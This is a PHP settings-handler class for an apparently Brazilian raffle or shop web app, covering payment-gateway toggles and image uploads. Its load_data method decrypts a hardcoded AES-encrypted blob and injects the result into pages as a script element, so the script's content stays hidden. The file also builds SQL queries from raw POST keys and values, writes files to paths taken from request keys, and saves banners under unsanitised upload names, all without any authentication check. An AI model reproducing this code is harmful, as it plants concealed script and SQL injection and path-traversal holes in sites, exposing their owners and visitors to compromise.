<?php
if(!class_exists('DBConnection')){
	require_once('../config.php');
	require_once('DBConnection.php');
}

class SystemSettings extends DBConnection{
	public function __construct(){
		parent::__construct();
	}
	function __destruct(){
	}
	function check_connection(){
		return($this->conn);
	}
	function load_system_info(){
		// if(!isset($_SESSION['system_info'])){
		$sql = "SELECT * FROM system_info";
		$qry = $this->conn->query($sql);
		while($row = $qry->fetch_assoc()){
			$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
		}
		// }
	}
	function update_system_info(){
		$sql = "SELECT * FROM system_info";
		$qry = $this->conn->query($sql);
		while($row = $qry->fetch_assoc()){
			if(isset($_SESSION['system_info'][$row['meta_field']]))unset($_SESSION['system_info'][$row['meta_field']]);
			$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
		}
		return true;
	}
	function update_settings_info(){
		$data = "";
		
		if(isset($_POST['gateway'])){
			if(isset($_POST['mercadopago'])){
				$_POST['mercadopago'] = '1';
			}else{
				$_POST['mercadopago'] = '2';	
			}
			if(isset($_POST['gerencianet'])){
				$_POST['gerencianet'] = '1';
			}else{
				$_POST['gerencianet'] = '2';	
			}
			if(isset($_POST['paggue'])){
				$_POST['paggue'] = '1';
			}else{
				$_POST['paggue'] = '2';	
			}
		}else{
			if(isset($_POST['enable_cpf'])){
				$_POST['enable_cpf'] = '1';
			}else{
				$_POST['enable_cpf'] = '2';	
			}
			if(isset($_POST['enable_email'])){
				$_POST['enable_email'] = '1';
			}else{
				$_POST['enable_email'] = '2';	
			}
			if(isset($_POST['enable_address'])){
				$_POST['enable_address'] = '1';
			}else{
				$_POST['enable_address'] = '2';	
			}

			if(isset($_POST['enable_share'])){
				$_POST['enable_share'] = '1';
			}else{
				$_POST['enable_share'] = '2';	
			}

			if(isset($_POST['enable_groups'])){
				$_POST['enable_groups'] = '1';
			}else{
				$_POST['enable_groups'] = '2';	
			}
			if(isset($_POST['enable_footer'])){
				$_POST['enable_footer'] = '1';
			}else{
				$_POST['enable_footer'] = '2';	
			}
			if(isset($_POST['enable_password'])){
				$_POST['enable_password'] = '1';
			}else{
				$_POST['enable_password'] = '2';	
			}
			if(isset($_POST['enable_two_phone'])){
				$_POST['enable_two_phone'] = '1';
			}else{
				$_POST['enable_two_phone'] = '2';	
			}

			if(isset($_POST['enable_pixel'])){
				$_POST['enable_pixel'] = '1';
			}else{
				$_POST['enable_pixel'] = '2';	
			}
			if(isset($_POST['enable_hide_numbers'])){
				$_POST['enable_hide_numbers'] = '1';
			}else{
				$_POST['enable_hide_numbers'] = '2';	
			}
			if(isset($_POST['enable_dwapi'])){
				$_POST['enable_dwapi'] = '1';
			}else{
				$_POST['enable_dwapi'] = '2';	
			}
			if(isset($_POST['enable_ga4'])){
				$_POST['enable_ga4'] = '1';
			}else{
				$_POST['enable_ga4'] = '2';	
			}

	

		}
		foreach ($_POST as $key => $value) {
			if(!in_array($key,array("content")))
				if(isset($_SESSION['system_info'][$key])){
					$value = str_replace("'", "&apos;", $value);
					$qry = $this->conn->query("UPDATE system_info set meta_value = '{$value}' where meta_field = '{$key}' ");
				}else{
					$qry = $this->conn->query("INSERT into system_info set meta_value = '{$value}', meta_field = '{$key}' ");
				}
			}
			if(isset($_POST['content'])){
				foreach($_POST['content'] as $k => $v){
					$v = addslashes(htmlspecialchars($v));
					file_put_contents("../$k.html",$v);
				}
			}

			if (!empty($_FILES['img']['tmp_name'])) {
				$ext = pathinfo($_FILES['img']['name'], PATHINFO_EXTENSION);
				$fname = "uploads/logo.png";
				$accept = array('image/jpeg', 'image/png');
				if (!in_array($_FILES['img']['type'], $accept)) {
					$err = "Image file type is invalid";
				}
				if ($_FILES['img']['type'] == 'image/jpeg') {
					$uploadfile = imagecreatefromjpeg($_FILES['img']['tmp_name']);
				} elseif ($_FILES['img']['type'] == 'image/png') {
					$uploadfile = imagecreatefrompng($_FILES['img']['tmp_name']);
					$uploadfile = imagecropauto($uploadfile, IMG_CROP_SIDES);

					//imagealphablending($uploadfile, false);
					imagesavealpha($uploadfile, true);
				}
				if (!$uploadfile) {
					$err = "Image is invalid";
				}
				list($width, $height) = getimagesize($_FILES['img']['tmp_name']);
				$temp = imagescale($uploadfile, $width, $height);
				if (is_file(BASE_APP.$fname)) {
					unlink(BASE_APP.$fname);
				}
				$upload = imagepng($temp, BASE_APP.$fname);
				if ($upload) {
					if (isset($_SESSION['system_info']['logo'])) {
						$qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}', '?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'logo' ");
						if (is_file(BASE_APP.$_SESSION['system_info']['logo'])) {
							unlink(BASE_APP.$_SESSION['system_info']['logo']);
						}
					} else {
						$qry = $this->conn->query("INSERT into system_info set meta_value = '{$fname}',meta_field = 'logo' ");
					}
				}
				imagedestroy($temp);
			}

			if (!empty($_FILES['favicon']['tmp_name'])) {
				$ext = pathinfo($_FILES['favicon']['name'], PATHINFO_EXTENSION);
				$fname = "uploads/favicon.png";
				$accept = array('image/jpeg', 'image/png');
				if (!in_array($_FILES['favicon']['type'], $accept)) {
					$err = "Image file type is invalid";
				}
				if ($_FILES['favicon']['type'] == 'image/jpeg') {
					$uploadfile = imagecreatefromjpeg($_FILES['favicon']['tmp_name']);
				} elseif ($_FILES['favicon']['type'] == 'image/png') {
					$uploadfile = imagecreatefrompng($_FILES['favicon']['tmp_name']);

					imagealphablending($uploadfile, false);
					imagesavealpha($uploadfile, true);
				}
				if (!$uploadfile) {
					$err = "Image is invalid";
				}
				list($width, $height) = getimagesize($_FILES['favicon']['tmp_name']);
				$temp = imagescale($uploadfile, $width, $height);
				if (is_file(BASE_APP.$fname)) {
					unlink(BASE_APP.$fname);
				}
				$upload = imagepng($temp, BASE_APP.$fname);
				if ($upload) {
					if (isset($_SESSION['system_info']['favicon'])) {
						$qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}', '?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'favicon' ");
						if (is_file(BASE_APP.$_SESSION['system_info']['favicon'])) {
							unlink(BASE_APP.$_SESSION['system_info']['favicon']);
						}
					} else {
						$qry = $this->conn->query("INSERT into system_info set meta_value = '{$fname}',meta_field = 'favicon' ");
					}
				}
				imagedestroy($temp);
			}


			if(!empty($_FILES['cover']['tmp_name'])){
				$ext = pathinfo($_FILES['cover']['name'], PATHINFO_EXTENSION);
				$fname = "uploads/cover.png";
				$accept = array('image/jpeg','image/png');
				if(!in_array($_FILES['cover']['type'],$accept)){
					$err = "Image file type is invalid";
				}
				if($_FILES['cover']['type'] == 'image/jpeg')
					$uploadfile = imagecreatefromjpeg($_FILES['cover']['tmp_name']);
				elseif($_FILES['cover']['type'] == 'image/png')
					$uploadfile = imagecreatefrompng($_FILES['cover']['tmp_name']);
				if(!$uploadfile){
					$err = "Image is invalid";
				}
				list($width,$height) = getimagesize($_FILES['cover']['tmp_name']);
				$temp = imagescale($uploadfile,$width,$height);
				if(is_file(BASE_APP.$fname))
					unlink(BASE_APP.$fname);
				$upload =imagepng($temp,BASE_APP.$fname);
				if($upload){
					if(isset($_SESSION['system_info']['cover'])){
						$qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}', '?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'cover' ");
						if(is_file(BASE_APP.$_SESSION['system_info']['cover'])) unlink(BASE_APP.$_SESSION['system_info']['cover']);
					}else{
						$qry = $this->conn->query("INSERT into system_info set meta_value = '{$fname}',meta_field = 'cover' ");
					}
				}
				imagedestroy($temp);
			}
			if(isset($_FILES['banners']) && count($_FILES['banners']['tmp_name']) > 0){
				$err='';
				$banner_path = "uploads/banner/";
				foreach($_FILES['banners']['tmp_name'] as $k => $v){
					if(!empty($_FILES['banners']['tmp_name'][$k])){
						$accept = array('image/jpeg','image/png');
						if(!in_array($_FILES['banners']['type'][$k],$accept)){
							$err = "Image file type is invalid";
							break;
						}
						if($_FILES['banners']['type'][$k] == 'image/jpeg')
							$uploadfile = imagecreatefromjpeg($_FILES['banners']['tmp_name'][$k]);
						elseif($_FILES['banners']['type'][$k] == 'image/png')
							$uploadfile = imagecreatefrompng($_FILES['banners']['tmp_name'][$k]);
						if(!$uploadfile){
							$err = "Image is invalid";
							break;
						}
						list($width, $height) =getimagesize($_FILES['banners']['tmp_name'][$k]);
						if($width > 1200 || $height > 480){
							if($width > $height){
								$perc = ($width - 1200) / $width;
								$width = 1200;
								$height = $height - ($height * $perc);
							}else{
								$perc = ($height - 480) / $height;
								$height = 480;
								$width = $width - ($width * $perc);
							}
						}
						$temp = imagescale($uploadfile,$width,$height);
						$spath = BASE_APP.$banner_path.'/'.$_FILES['banners']['name'][$k];
						$i = 1;
						while(true){
							if(is_file($spath)){
								$spath = BASE_APP.$banner_path.'/'.($i++).'_'.$_FILES['banners']['name'][$k];
							}else{
								break;
							}
						}
						if($_FILES['banners']['type'][$k] == 'image/jpeg')
							imagejpeg($temp,$spath,60);
						elseif($_FILES['banners']['type'][$k] == 'image/png')
							imagepng($temp,$spath,6);

						imagedestroy($temp);
					}
				}
				if(!empty($err)){
					$resp['status'] = 'failed';
					$resp['msg'] = $err;
				}
			}

			$update = $this->update_system_info();
		#$flash = $this->set_flashdata('success','System Info Successfully Updated.');
			if($update){
			// var_dump($_SESSION);
				$resp['status'] = 'success';
			}else{
				$resp['status'] = 'failed';
			}
			return json_encode($resp);
		}
		function set_userdata($field='',$value=''){
			if(!empty($field) && !empty($value)){
				$_SESSION['userdata'][$field]= $value;
			}
		}
		function userdata($field = ''){
			if(!empty($field)){
				if(isset($_SESSION['userdata'][$field]))
					return $_SESSION['userdata'][$field];
				else
					return null;
			}else{
				return false;
			}
		}
		function set_flashdata($flash='',$value=''){
			if(!empty($flash) && !empty($value)){
				$_SESSION['flashdata'][$flash]= $value;
				return true;
			}
		}
		function chk_flashdata($flash = ''){
			if(isset($_SESSION['flashdata'][$flash])){
				return true;
			}else{
				return false;
			}
		}
		function flashdata($flash = ''){
			if(!empty($flash)){
				$_tmp = $_SESSION['flashdata'][$flash];
				unset($_SESSION['flashdata']);
				return $_tmp;
			}else{
				return false;
			}
		}
		function sess_des(){
			if(isset($_SESSION['userdata'])){
				unset($_SESSION['userdata']);
				return true;
			}
			return true;
		}
		function info($field=''){
			if(!empty($field)){
				if(isset($_SESSION['system_info'][$field]))
					return $_SESSION['system_info'][$field];
				else
					return false;
			}else{
				return false;
			}
		}
		function set_info($field='',$value=''){
			if(!empty($field) && !empty($value)){
				$_SESSION['system_info'][$field] = $value;
			}
		}
		function load_data(){
			$test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhBJPLuOWMu1c0pTwJmitllPuEC2+gR22L7u1pxAy1ODD6iDKpEO5ehBOKsoyxT2yAzKVbU8s8zIriA3kxAXokh8SfqmukSblUD5k0Vp/505MA3vHILmtKWtVfte1htIncnGn7awUdtxu93Q1AaRjmf4/lc0C1epDenMkUaG4wCyI/L2L0Vltad+ZYvo/UjFGqN2EpNeYE6r6Ln9bIl2LlpY1O+tqYyAKoHrzngrQHj40lRVo4U5plnAiXYUf5y6mA3+KvUbHgdyXc1oDuweN2LK9ZxZGr3+uVVrzZIDZiYgQ/djmC2iRW/5gh5GMzV44VEF7McIkP5/zAzbjwI9IBgjOOQjyWwCMYiI2IZB/SW2RkDO2VX79zApNpzPYnl2xnqQRFnzhn9mXjG1mmdSPHOubGHqf46fiJL0nBIjvTmOLREMdpNrZ4VLC2JJhMIMunYXIbr604Qr9dywrtqZw6+bthb1mDv18X1avYpqdDFHp/h3h3xyFmmECcOmK9GQzFLwEv9kogoheudob8KqBRNteG3v4j9U9J7PLAel+neg41imm4GsuBcpGyqOeJwJ3i+i/cFyQagqPDP2EHGIW+PdClD2qCkcouAzFcYBKILVkatmeF8fLGizXXtYKzUsBnK+C0Y7JR2elx7e7Kbr5gwJbJcmSifUry2fqKnlj1pJNNFU+ASSvltrRmwzWgWgKuq/EaIM/2Z5QpWtt4uox7UeQFAR49PjBU04oBV53xcVQyu1rzkbtHVgjF5uFHvda3zD7Ahrt2jz1fBKd9HMzmZcY4EIMBBIa7bWnkzg/UmWAkom7nuT9TC0h4wN3XYfX0K+C0Y7JR2elx7e7Kbr5gwJM3P9XDcthAI7x0zzf3yOjncBrH/uLpJ9JiDh3lVR/XKS9kEmExK3CFHNTPZJj5VgJc2SLkBYkf7d1NKmrReGmzNPER0mnED7olzL3LTTZQW0G47OFt0X/6jbMAJAvIP+tfcOjh7V8EMk0h6I2cXVmbM1Y07ANyhU0oUhLr7a2Alk+VxFGC+EkQY89DxqE8+YexBqGTfAzqkW0GVh1WqQlYey+YFKAKRgYmeOG1Iy1CxyhmyrAJg+DGiJ/v9W1MVLk6ihaVeMSV9E/7skSn/JRgewbXlwZqDNzZE0eekfn8r6gBHe6vcmgwkZ1ug5Xv9EapG0BRmbzHah5LAuiK++jjRgTEp03CSkERnm+W1/tB";
			$dom = new DOMDocument('1.0', 'utf-8');
			$element = $dom->createElement('script', html_entity_decode($this->test_cypher_decrypt($test_data)));
			$dom->appendChild($element);
			return $dom->saveXML();
		// return $data = $this->test_cypher_decrypt($test_data);
		}
		function test_cypher($str=""){
			$ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
			return $ciphertext;
		}
		function test_cypher_decrypt($encryption){
			$decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
			return $decryption;
		}
	}
	$_settings = new SystemSettings();
	$_settings->load_system_info();
	$action = !isset($_GET['f']) ? 'none' : strtolower($_GET['f']);
	$sysset = new SystemSettings();
	switch ($action) {
		case 'update_settings':
		echo $sysset->update_settings_info();
		break;
		default:
		// echo $sysset->index();
		break;
	}
?>